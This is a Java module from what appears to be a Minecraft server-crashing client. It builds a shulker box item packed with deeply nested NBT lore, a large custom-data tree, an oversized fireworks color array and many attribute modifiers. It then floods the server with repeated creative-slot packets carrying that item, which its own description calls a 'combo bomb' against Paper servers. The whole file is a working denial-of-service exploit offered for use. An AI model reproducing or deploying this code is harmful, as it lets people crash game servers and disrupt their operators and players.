package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.module.impl.crash.NbtBombTrees;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataAttributeModifiers;
import me.dannycrasher.client.protocol.components.data.impl.DataContainer;
import me.dannycrasher.client.protocol.components.data.impl.DataCustomData;
import me.dannycrasher.client.protocol.components.data.impl.DataFireworks;
import me.dannycrasher.client.protocol.components.data.impl.DataItemName;
import me.dannycrasher.client.protocol.components.data.impl.DataLore;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import net.minecraft.nbt.Tag;

public class CreativeMultiComponent extends Module {
	private ScheduledExecutorService executorService;

	public CreativeMultiComponent() {
		super("CreativeMultiComponent", "Paper creative-slot multi-component combo bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "25");
		addArgument("scale", ArgumentType.INT, 1, 64, "16");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		int scale = context.getInt("scale");
		Tag loreLine = NbtBombTrees.translateNest(Math.min(scale, 40));
		List<Tag> lore = new ArrayList<>();
		for (int i = 0; i < scale; i++) {
			lore.add(loreLine);
		}

		List<ItemStack> containerItems = new ArrayList<>();
		ItemStack stone = new ItemStack(ItemType.STONE.getId(protocol), 1, null);
		for (int i = 0; i < scale; i++) {
			containerItems.add(stone);
		}

		int[] colors = new int[scale * 64];
		Arrays.fill(colors, 0xFFFFFF);
		List<DataFireworks.Explosion> explosions = List.of(
				new DataFireworks.Explosion(0, colors, new int[]{0xFF00FF}, true, true)
		);

		DataComponents components = new DataComponents();
		components.put(new DataLore(lore));
		components.put(new DataItemName(loreLine));
		components.put(new DataCustomData(NbtBombTrees.nestedTree(scale, Math.min(8, scale))));
		components.put(new DataContainer(containerItems));
		components.put(new DataFireworks(127, explosions));
		components.put(new DataAttributeModifiers(scale * 8, true));

		ItemStack item = new ItemStack(ItemType.SHULKER_BOX.getId(protocol), 1, components);
		executorService = CreativeAttackHelper.start(
				this, context, executorService,
				context.getInt("packets"), context.getInt("threadSleep"), context.getInt("loopAmount"),
				context.getInt("slot"), item
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
